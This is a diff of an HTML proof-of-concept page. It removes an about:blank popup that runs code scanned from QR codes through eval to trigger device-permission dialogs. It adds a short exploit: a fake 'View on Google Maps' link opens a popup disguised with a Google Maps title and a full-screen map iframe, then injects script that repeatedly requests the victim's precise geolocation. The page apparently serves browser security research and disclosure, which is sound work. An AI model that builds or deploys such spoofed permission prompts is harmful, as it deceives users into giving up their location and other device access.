@@ -1,548 +1,59 @@
-<!DOCTYPE html>
-<html lang="id">
 <head>
-<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>QR Scanner in about:blank — PoC</title>
-<style>
-  * { box-sizing: border-box; }
-  body { font-family: system-ui, -apple-system, sans-serif; max-width: 860px; margin: 0 auto; padding: 24px; line-height: 1.55; background: #f7f7f7; color: #222; }
-  h1 { font-size: 1.3em; margin-top: 0; }
-  h2 { font-size: 1.05em; margin-top: 0; }
-  .warn { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px 14px; border-radius: 4px; margin: 12px 0; font-size: 14px; }
-  .danger { background: #f8d7da; border-left: 4px solid #dc3545; padding: 12px 14px; border-radius: 4px; margin: 12px 0; font-size: 14px; }
-  .info { background: #d1ecf1; border-left: 4px solid #17a2b8; padding: 12px 14px; border-radius: 4px; margin: 12px 0; font-size: 14px; }
-  .card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); margin: 16px 0; }
-  button { padding: 12px 22px; font-size: 15px; border-radius: 6px; border: 0; cursor: pointer; background: #007bff; color: #fff; font-weight: 500; margin: 4px 4px 4px 0; }
-  button:hover:not(:disabled) { background: #0056b3; }
-  button:disabled { background: #ccc; cursor: not-allowed; }
-  button.success { background: #28a745; }
-  button.success:hover:not(:disabled) { background: #1e7e34; }
-  button.gray { background: #6c757d; }
-  button.gray:hover:not(:disabled) { background: #495057; }
-  code { background: #eee; padding: 2px 6px; border-radius: 3px; font-family: ui-monospace, monospace; font-size: 13px; }
-  ol, ul { padding-left: 20px; margin: 8px 0; }
-  li { margin: 6px 0; }
-  #diag { font-family: ui-monospace, monospace; font-size: 12px; background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px; margin: 12px 0; }
-  #diag div { margin: 3px 0; }
-  #diag .label { color: #666; display: inline-block; width: 200px; }
-  #status { margin-top: 12px; display: none; }
-  #preview { display: none; margin-top: 12px; }
-  #preview video { width: 100%; max-width: 320px; border-radius: 8px; background: #000; display: block; }
-  #iframeFallback { display: none; margin-top: 16px; }
-  #iframeFallback iframe { width: 100%; height: 820px; border: 1px solid #ddd; border-radius: 6px; background: #fff; }
-</style>
 </head>
-<body>
-
-<h1>📷 QR → <code>about:blank</code> → Eksekusi</h1>
-
-<div class="danger"><strong>⚠️ SECURITY RESEARCH TOOL</strong> — jalankan hanya di <code>localhost</code> / domain Anda sendiri.</div>
-
-<div class="info">
-  <strong>ℹ️ Kenapa kamera di-pass dari parent?</strong><br>
-  Chromium <strong>tidak mengizinkan</strong> <code>getUserMedia</code> dipanggil dari popup <code>about:blank</code> — dialog permission tidak muncul, langsung <code>NotAllowedError</code>. Ini <em>by design</em>.<br>
-  Solusi: akses kamera di parent, lalu pass <code>MediaStream</code> ke popup via <code>video.srcObject</code> (same-origin OK).<br>
-  PoC tetap valid: dialog <strong>Bluetooth/USB/Serial/HID/Passkey</strong> tetap dipicu dari dalam popup <code>about:blank</code>.
-</div>
-
-<div id="diag">
-  <div><span class="label">isSecureContext:</span><strong id="d-sec">?</strong></div>
-  <div><span class="label">location.origin:</span><strong id="d-origin">?</strong></div>
-  <div><span class="label">camera permission:</span><strong id="d-camperm">?</strong></div>
-  <div><span class="label">BarcodeDetector:</span><strong id="d-bd">?</strong></div>
-  <div><span class="label">warmStream:</span><strong id="d-warm">none</strong></div>
-</div>
-
-<div class="card">
-  <h2>Langkah</h2>
-  <ol>
-    <li><strong>Grant Camera Permission</strong> — buka kamera di parent, stream disimpan.</li>
-    <li><strong>Open QR Scanner</strong> — popup <code>about:blank</code> terbuka, stream dipass ke popup.</li>
-    <li>Di popup: <strong>Start Scanning</strong> → scan QR.</li>
-    <li><strong>Execute</strong> → dialog permission (Bluetooth/USB/Passkey/dll.) tampil dengan <code>about:blank</code> → bug terbukti.</li>
-  </ol>
-  <button id="warmBtn" class="success">1. ✅ Grant Camera Permission</button>
-  <button id="openBtn" disabled>2. ▶ Open QR Scanner (about:blank)</button>
-  <button id="testBtn" class="gray">🧪 Test Popup</button>
-  <div id="status"></div>
-  <div id="preview"><video id="previewVideo" autoplay playsinline muted></video></div>
-</div>
-
-<div id="iframeFallback">
-  <h2>Iframe fallback (<code>about:srcdoc</code>)</h2>
-  <p style="font-size:13px;color:#666;">Popup diblokir — scanner di-render di iframe. URL dokumen = <code>about:srcdoc</code>, origin = domain Anda.</p>
-  <iframe id="fallbackIframe" allow="camera; microphone; bluetooth; usb; serial; hid; midi; publickey-credentials-get; publickey-credentials-create; payment; screen-wake-lock; idle-detection" srcdoc=""></iframe>
-</div>
+<a id="link">View on Google Maps</p>
 
 <script>
-(function () {
-  'use strict';
+var spoof = "https://www.google.com/maps/place/San+Francisco,+CA,+USA/@37.7573683,-122.7177898,10z/data=!3m1!4b1!4m5!3m4!1s0x80859a6d00690021:0x4a501367f076adff!8m2!3d37.7750568!4d-122.419281";
+var link = document.getElementById("link");
 
-  var $ = function (id) { return document.getElementById(id); };
-  var statusEl = $('status');
+link.href = spoof;
+link.onclick = function(e) {
+	setTimeout(function(){
 
-  var warmStream = null;
-  var popupWin = null;
+	var qwin = open("", "_blank", "");
+    var qdoc = qwin.document;
 
-  function setStatus(html, type) {
-    var colors = { ok: '#28a745', err: '#dc3545', warn: '#856404', info: '#0c5460' };
-    statusEl.style.display = 'block';
-    statusEl.innerHTML = '<div style="padding:10px 12px;border-radius:6px;border-left:4px solid ' +
-      (colors[type] || '#666') + ';background:#fff;font-size:13px;">' + html + '</div>';
-  }
+    qdoc.head.innerHTML = `<title>${spoof}</title><meta name="viewport" content="width=device-width, initial-scale=1.0">`
 
-  $('d-sec').textContent = window.isSecureContext;
-  $('d-origin').textContent = location.origin;
-  $('d-bd').textContent = ('BarcodeDetector' in window);
+    qiframe = document.createElement('iframe')
+    qiframe.setAttribute('src', 'https://www.google.com/maps/embed?pb=!1m28!1m12!1m3!1d50440.015026354726!2d-122.4851991208114!3d37.801733917011646!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!4m13!3e6!4m5!1s0x808586deffffffc3%3A0xcded139783705509!2sGolden%20Gate%20Bridge%2C%20Golden%20Gate%20Bridge%2C%20San%20Francisco%2C%20California%2C%20Amerika%20Serikat!3m2!1d37.8199286!2d-122.4782551!4m5!1s0x80859a6d00690021%3A0x4a501367f076adff!2sSan%20Francisco%2C%20California%2C%20Amerika%20Serikat!3m2!1d37.7749295!2d-122.4194155!5e0!3m2!1sid!2sau!4v1605386906677!5m2!1sid!2sau')
+    qiframe.setAttribute('style', 'position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;')
+    qdoc.body.appendChild(qiframe);
 
-  try {
-    if (navigator.permissions && navigator.permissions.query) {
-      navigator.permissions.query({ name: 'camera' })
-        .then(function (p) {
-          $('d-camperm').textContent = p.state;
-          p.onchange = function () { $('d-camperm').textContent = p.state; };
-        })
-        .catch(function () { $('d-camperm').textContent = 'query failed'; });
-    } else {
-      $('d-camperm').textContent = 'unsupported';
-    }
-  } catch (e) {
-    $('d-camperm').textContent = 'unsupported';
-  }
+    var injectScript = `
+        var options = {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        };
 
-  /* ============ WARM UP — keep stream alive ============ */
-  $('warmBtn').addEventListener('click', async function () {
-    setStatus('Meminta izin kamera…', 'info');
-    try {
-      if (warmStream) {
-        warmStream.getTracks().forEach(function (t) { t.stop(); });
-        warmStream = null;
-      }
-      warmStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
-        audio: false
-      });
-      // JANGAN stop — tetap hidup agar bisa dipass ke popup
-      $('preview').style.display = 'block';
-      $('previewVideo').srcObject = warmStream;
-      $('openBtn').disabled = false;
-      $('d-warm').textContent = 'active (' + warmStream.getVideoTracks().length + ' track)';
-      setStatus('✅ Kamera granted & stream AKTIF. Lanjut klik langkah 2.', 'ok');
-    } catch (e) {
-      setStatus(
-        '<strong>❌ Kamera gagal:</strong> <code>' + e.name + ': ' + e.message + '</code><br>' +
-        '<small>Klik 🔒 di address bar → izinkan kamera, lalu ulangi.</small>',
-        'err');
-    }
-  });
+        function success(pos) {
+            var crd = pos.coords;
 
-  /* ============ OPEN POPUP ============ */
-  $('openBtn').addEventListener('click', function () {
-    if (!warmStream) {
-      setStatus('⚠️ Klik langkah 1 dulu untuk grant kamera.', 'warn');
-      return;
-    }
-    statusEl.style.display = 'none';
-    setStatus('Membuka popup…', 'info');
-
-    if (popupWin && !popupWin.closed) {
-      popupWin.close();
-    }
-    popupWin = openBlankWindow();
-    if (!popupWin) {
-      showIframeFallback();
-      setStatus(
-        '<strong>⚠️ Popup diblokir.</strong> Scanner muncul di iframe fallback di bawah.<br>' +
-        'Untuk popup sungguhan: klik ikon 🚫 di address bar → <em>Always allow popups</em> → ulangi.',
-        'warn');
-      return;
-    }
-
-    try {
-      var ok = injectPopup(popupWin);
-      if (!ok) {
-        setStatus('⚠️ Popup terbuka tapi konten gagal di-inject. Cek Console (F12).', 'warn');
-        return;
-      }
-
-      // PASS STREAM ke popup setelah script siap
-      setTimeout(function () {
-        try {
-          if (popupWin.__initParentStream) {
-            popupWin.__initParentStream(warmStream);
-          }
-          var info = '';
-          try {
-            info = ' <code>href=' + popupWin.location.href +
-                   '</code>, <code>origin=' + popupWin.location.origin + '</code>';
-          } catch (e) {
-            info = ' <span style="color:#dc3545">(origin tidak terbaca: ' + e.name + ')</span>';
-          }
-          setStatus('✅ Popup <code>about:blank</code> terbuka & stream dipass.' + info +
-                    '<br>Di popup: klik <strong>Start Scanning</strong>.', 'ok');
-        } catch (e) {
-          setStatus('⚠️ Stream gagal dipass: <code>' + e.name + ': ' + e.message + '</code>', 'warn');
+        alert(\`Your current position has been leaked:\\n
+        Latitude : \${crd.latitude}\\n
+        Longitude: \${crd.longitude}\\n
+        More or less \${crd.accuracy} meters.\`)
         }
-      }, 100);
 
-    } catch (e) {
-      setStatus('❌ Gagal inject: <code>' + e.message + '</code>', 'err');
-      console.error('[PoC] inject failed:', e);
-    }
-    popupWin.focus();
-  });
-
-  function openBlankWindow() {
-    var attempts = [
-      function () { return window.open('', '_blank', 'width=920,height=900'); },
-      function () { return window.open('about:blank', '_blank', 'width=920,height=900'); },
-      function () { return window.open('', '_blank'); },
-      function () { return window.open('about:blank', '_blank'); }
-    ];
-    for (var i = 0; i < attempts.length; i++) {
-      var w = null;
-      try { w = attempts[i](); } catch (e) {}
-      if (w && !w.closed) { console.log('[PoC] popup attempt', i + 1); return w; }
-    }
-    return null;
-  }
-
-  function injectPopup(w) {
-    var doc = w.document;
-    var parser = new DOMParser();
-    var parsed = parser.parseFromString(popupHTML(), 'text/html');
-
-    var styles = parsed.querySelectorAll('style');
-    for (var i = 0; i < styles.length; i++) {
-      var ns = doc.createElement('style');
-      ns.textContent = styles[i].textContent;
-      doc.head.appendChild(ns);
-    }
-
-    var bodyHTML = parsed.body.innerHTML.replace(/<script[\s\S]*?<\/script>/gi, '');
-    doc.body.innerHTML = bodyHTML;
-
-    var scripts = parsed.querySelectorAll('script');
-    for (var j = 0; j < scripts.length; j++) {
-      var sc = doc.createElement('script');
-      if (scripts[j].src) sc.src = scripts[j].src;
-      else sc.textContent = scripts[j].textContent;
-      doc.body.appendChild(sc);
-    }
-    return !!doc.getElementById('startBtn');
-  }
-
-  function showIframeFallback() {
-    var iframe = $('fallbackIframe');
-    if (!iframe.dataset.loaded) {
-      // Iframe fallback: kirim stream ke iframe juga
-      iframe.srcdoc = popupHTML();
-      iframe.dataset.loaded = '1';
-      iframe.addEventListener('load', function () {
-        try {
-          if (iframe.contentWindow.__initParentStream && warmStream) {
-            iframe.contentWindow.__initParentStream(warmStream);
-          }
-        } catch (e) { console.warn('iframe stream pass failed:', e); }
-      }, { once: true });
-    }
-    $('iframeFallback').style.display = 'block';
-    $('iframeFallback').scrollIntoView({ behavior: 'smooth' });
-  }
-
-  /* ============ Test popup ============ */
-  $('testBtn').addEventListener('click', function () {
-    statusEl.style.display = 'none';
-    var w = window.open('about:blank', '_blank', 'width=400,height=320');
-    if (!w) { setStatus('❌ Popup diblokir bahkan untuk test.', 'err'); return; }
-    try {
-      var doc = w.document;
-      var camStateInPopup = 'querying…';
-      doc.body.innerHTML = '<h2>✅ Test OK</h2>' +
-        '<p>href: <code>' + doc.location.href + '</code></p>' +
-        '<p>origin: <code>' + doc.location.origin + '</code></p>' +
-        '<p>window.opener: <code>' + (w.opener ? 'connected' : 'null') + '</code></p>' +
-        '<p>camera in about:blank: <code id="camstate">' + camStateInPopup + '</code></p>' +
-        '<p style="color:#dc3545"><strong>Catatan:</strong> camera di <code>about:blank</code> tidak diizinkan Chromium — itu <em>by design</em>. Stream dari parent akan dipass via <code>video.srcObject</code>.</p>';
-      if (w.navigator.permissions) {
-        w.navigator.permissions.query({ name: 'camera' })
-          .then(function (p) { doc.getElementById('camstate').textContent = p.state; })
-          .catch(function (e) { doc.getElementById('camstate').textContent = 'error: ' + e.name; });
-      }
-      setStatus('✅ Test popup berhasil.', 'ok');
-    } catch (e) {
-      setStatus('⚠️ Popup terbuka tapi DOM gagal: <code>' + e.name + ': ' + e.message + '</code>', 'err');
-    }
-  });
-
-  /* ============ Popup HTML ============ */
-  function popupHTML() {
-    return `<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<title>about:blank — QR Scanner</title>
-<style>
-  body { font-family: system-ui, -apple-system, sans-serif; max-width: 760px; margin: 0 auto; padding: 18px; background: #fafafa; line-height: 1.5; }
-  h2 { margin-top: 0; font-size: 1.15em; }
-  h3 { font-size: 1em; margin: 16px 0 6px; }
-  .meta { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px 12px; font-size: 13px; font-family: ui-monospace, monospace; }
-  .meta div { margin: 2px 0; }
-  .meta .label { color: #666; display: inline-block; width: 140px; }
-  video { width: 100%; max-width: 480px; border-radius: 8px; background: #000; display: block; margin: 12px auto; }
-  button { padding: 9px 16px; font-size: 14px; border-radius: 5px; border: 0; cursor: pointer; background: #007bff; color: #fff; margin: 4px 4px 4px 0; }
-  button:hover:not(:disabled) { background: #0056b3; }
-  button:disabled { background: #ccc; cursor: not-allowed; }
-  button.gray { background: #6c757d; }
-  button.gray:hover:not(:disabled) { background: #495057; }
-  button.danger { background: #dc3545; }
-  button.danger:hover:not(:disabled) { background: #a71d2a; }
-  button.success { background: #28a745; }
-  pre { background: #f4f4f4; border: 1px solid #e0e0e0; border-radius: 6px; padding: 10px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-size: 12px; font-family: ui-monospace, monospace; min-height: 40px; }
-  textarea { width: 100%; min-height: 70px; font-family: ui-monospace, monospace; font-size: 12px; padding: 8px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
-  .status { font-size: 13px; color: #555; margin-top: 6px; }
-  .ok { color: #28a745; }
-  .err { color: #dc3545; }
-  .note { background: #d1ecf1; border-left: 4px solid #17a2b8; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 8px 0; }
-  #fileFallback { display: none; margin-top: 12px; padding: 12px; background: #fff3cd; border-radius: 6px; border-left: 4px solid #ffc107; }
-  #fileFallback label { display: block; margin-top: 8px; }
-</style>
-</head>
-<body>
-<h2>about:blank — QR Scanner &amp; Executor</h2>
-<div class="meta">
-  <div><span class="label">location.href:</span><strong id="mHref">?</strong></div>
-  <div><span class="label">location.origin:</span><strong id="mOrigin">?</strong></div>
-  <div><span class="label">window.opener:</span><strong id="mOpener">?</strong></div>
-  <div><span class="label">camera (native):</span><strong id="mCam">?</strong></div>
-</div>
-<div class="note" id="streamNote">
-  Kamera native di <code>about:blank</code> diblokir Chromium. Stream akan dipass dari parent.
-</div>
-<h3>1. Scan QR</h3>
-<video id="video" autoplay playsinline muted></video>
-<div>
-  <button id="startBtn" disabled>▶ Start Scanning</button>
-  <button id="stopBtn" class="gray" disabled>⏹ Stop</button>
-</div>
-<div class="status" id="scanStatus">Menunggu stream dari parent…</div>
-<div id="fileFallback">
-  <strong>⚠️ Stream kamera tidak tersedia.</strong> Pakai fallback:
-  <label><input type="file" accept="image/*" capture="environment" id="fileCapture" style="display:none"><button type="button" id="captureBtn" class="success">📷 Take Photo</button></label>
-  <label><input type="file" accept="image/*" id="fileUpload" style="display:none"><button type="button" id="uploadBtn">🖼 Upload Image</button></label>
-</div>
-<h3>2. Hasil &amp; Eksekusi</h3>
-<pre id="result">(belum ada QR terdeteksi)</pre>
-<button id="execBtn" class="danger" disabled>🚀 Execute di about:blank ini</button>
-<div class="status" id="execStatus"></div>
-<pre id="log" style="display:none"></pre>
-<h3>3. Manual (fallback)</h3>
-<textarea id="manual" placeholder="navigator.bluetooth.requestDevice({acceptAllDevices:true})"></textarea>
-<div><button id="manualBtn" class="danger" style="margin-top:6px;">🚀 Execute manual</button></div>
-<script>
-(function(){
-  'use strict';
-  var $ = function(id){ return document.getElementById(id); };
-  $('mHref').textContent = location.href;
-  $('mOrigin').textContent = location.origin;
-  $('mOpener').textContent = window.opener ? 'connected' : 'null (severed)';
-
-  // Cek camera permission native (harusnya denied/prompt di about:blank)
-  if (navigator.permissions && navigator.permissions.query) {
-    navigator.permissions.query({ name: 'camera' }).then(function(p){
-      $('mCam').textContent = p.state + ' (expected: not-granted)';
-    }).catch(function(e){ $('mCam').textContent = 'error: ' + e.name; });
-  } else {
-    $('mCam').textContent = 'unsupported';
-  }
-
-  var stream = null;
-  var parentStream = null;
-  var ownsStream = false;
-  var rafId = null, detector = null, jsQRReady = false;
-  var scanActive = false, scannedCode = '';
-  var canvas = document.createElement('canvas');
-  var ctx = canvas.getContext('2d', { willReadFrequently: true });
-
-  /* ---------- Dipanggil parent setelah injection ---------- */
-  window.__initParentStream = function(s) {
-    parentStream = s;
-    var v = $('video');
-    if (v && s) {
-      try {
-        v.srcObject = s;
-        v.play().catch(function(){});
-      } catch (e) { console.warn('srcObject set failed:', e); }
-    }
-    $('streamNote').innerHTML = '<span class="ok">✅ Stream kamera diterima dari parent.</span>';
-    $('scanStatus').innerHTML = '<span class="ok">✅ Kamera siap (via parent). Klik Start Scanning.</span>';
-    $('startBtn').textContent = '▶ Start Scanning';
-    $('startBtn').disabled = false;
-  };
-
-  async function ensureDetector() {
-    if ('BarcodeDetector' in window) {
-      try { return new BarcodeDetector({ formats: ['qr_code'] }); } catch (e) {}
-    }
-    if (typeof jsQR === 'undefined') {
-      await new Promise(function(res, rej){
-        var s = document.createElement('script');
-        s.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js';
-        s.onload = res; s.onerror = rej;
-        document.head.appendChild(s);
-      });
-    }
-    jsQRReady = true;
-    return null;
-  }
-
-  async function startScan() {
-    try {
-      if (parentStream) {
-        stream = parentStream;
-        ownsStream = false;
-        $('video').srcObject = stream;
-        await $('video').play();
-      } else {
-        // Fallback: coba getUserMedia sendiri (akan gagal di about:blank)
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'environment' }, audio: false
-          });
-          ownsStream = true;
-          $('video').srcObject = stream;
-          await $('video').play();
-        } catch (e) {
-          $('fileFallback').style.display = 'block';
-          $('scanStatus').innerHTML = '<span class="err">❌ getUserMedia gagal: ' + e.name + '</span>';
-          return;
+        function error(err) {
+            console.warn(\`ERROR(\${err.code}): \${err.message}\`);
+            navigator.geolocation.getCurrentPosition(success,error,options);
         }
-      }
-      detector = await ensureDetector();
-      $('scanStatus').textContent = detector ? '📷 Scanning (BarcodeDetector)…' : '📷 Scanning (jsQR)…';
-      scanActive = true;
-      $('startBtn').disabled = true;
-      $('stopBtn').disabled = false;
-      loop();
-    } catch (e) {
-      $('scanStatus').innerHTML = '<span class="err">❌ ' + e.name + ': ' + e.message + '</span>';
-      $('fileFallback').style.display = 'block';
-    }
-  }
 
-  async function loop() {
-    if (!scanActive) return;
-    var v = $('video');
-    if (v.readyState === v.HAVE_ENOUGH_DATA) {
-      var w = v.videoWidth, h = v.videoHeight;
-      if (w && h) {
-        canvas.width = w; canvas.height = h;
-        ctx.drawImage(v, 0, 0, w, h);
-        var found = null;
-        if (detector) {
-          try { var codes = await detector.detect(canvas); if (codes && codes.length) found = codes[0].rawValue; } catch (e) {}
-        } else if (jsQRReady && typeof jsQR !== 'undefined') {
-          try {
-            var img = ctx.getImageData(0, 0, w, h);
-            var qr = jsQR(img.data, w, h, { inversionAttempts: 'dontInvert' });
-            if (qr && qr.data) found = qr.data;
-          } catch (e) {}
-        }
-        if (found) { onDetected(found); return; }
-      }
-    }
-    rafId = requestAnimationFrame(loop);
-  }
+        navigator.geolocation.getCurrentPosition(success,error,options);
+    `
 
-  function stopScan() {
-    scanActive = false;
-    if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
-    // HANYA stop kalau kita yang buka (ownsStream)
-    if (stream && ownsStream) {
-      stream.getTracks().forEach(function(t){ t.stop(); });
-    }
-    // Kalau parentStream: jangan stop, parent yang punya
-    $('startBtn').disabled = false;
-    $('stopBtn').disabled = true;
-  }
+    qembed = document.createElement('embed');
+    qembed.setAttribute("src", `javascript:${injectScript.toString()}`)
 
-  function onDetected(code) {
-    scannedCode = code;
-    $('result').textContent = code;
-    $('execBtn').disabled = false;
-    $('scanStatus').innerHTML = '<span class="ok">✅ QR terdeteksi.</span>';
-    beep(); stopScan();
-  }
+    setTimeout(function(){
+        qdoc.body.appendChild(qembed);
+    }, 1200)
+    
+    }, 333);
 
-  function beep() {
-    try {
-      var ac = new (window.AudioContext || window.webkitAudioContext)();
-      var o = ac.createOscillator(), g = ac.createGain();
-      o.connect(g); g.connect(ac.destination);
-      o.frequency.value = 880; g.gain.value = 0.08;
-      o.start(); setTimeout(function(){ o.stop(); ac.close(); }, 100);
-    } catch (e) {}
-  }
-
-  function normalize(raw) {
-    var code = String(raw || '').trim();
-    if (/^javascript:/i.test(code)) code = code.replace(/^javascript:/i, '');
-    try { code = decodeURIComponent(code); } catch (e) {}
-    return code;
-  }
-
-  function execute(raw) {
-    var code = normalize(raw);
-    if (!code) { $('execStatus').textContent = '⚠️ Tidak ada kode.'; return; }
-    $('log').style.display = 'block';
-    $('log').textContent = '► Executing in about:blank…';
-    $('execStatus').textContent = 'Kode dijalankan. Permission dialog (Bluetooth/USB/Passkey/dll.) akan menampilkan about:blank.';
-    var wrapped = '(async () => {\n' + code + '\n})().catch(e => {' +
-      '  var l = document.getElementById("log");' +
-      '  if (l) l.textContent += "\\n✗ " + e.name + ": " + e.message;' +
-      '});';
-    try { (0, eval)(wrapped); }
-    catch (e) { $('log').textContent += '\n✗ Sync error: ' + e.name + ': ' + e.message; }
-  }
-
-  async function handleFileSelect(e) {
-    var file = e.target.files[0];
-    if (!file) return;
-    var img = new Image();
-    img.onload = async function () {
-      canvas.width = img.width; canvas.height = img.height;
-      ctx.drawImage(img, 0, 0);
-      if (!detector) await ensureDetector();
-      var found = null;
-      if (detector) {
-        try { var codes = await detector.detect(canvas); if (codes && codes.length) found = codes[0].rawValue; } catch (err) {}
-      }
-      if (!found && typeof jsQR !== 'undefined') {
-        var imageData = ctx.getImageData(0, 0, img.width, img.height);
-        var qr = jsQR(imageData.data, img.width, img.height);
-        if (qr) found = qr.data;
-      }
-      if (found) onDetected(found);
-      else $('scanStatus').innerHTML = '<span class="err">❌ QR tidak ditemukan di gambar.</span>';
-    };
-    img.src = URL.createObjectURL(file);
-  }
-
-  $('startBtn').onclick = startScan;
-  $('stopBtn').onclick = stopScan;
-  $('execBtn').onclick = function(){ execute(scannedCode); };
-  $('manualBtn').onclick = function(){ execute($('manual').value); };
-  var fc = document.getElementById('fileCapture');
-  var fu = document.getElementById('fileUpload');
-  if (fc) { document.getElementById('captureBtn').onclick = function(){ fc.click(); }; fc.onchange = handleFileSelect; }
-  if (fu) { document.getElementById('uploadBtn').onclick = function(){ fu.click(); }; fu.onchange = handleFileSelect; }
-})();
-<\/script>
-</body>
-</html>`;
-  }
-})();
+return false;
+}
 </script>
-</body>
-</html>
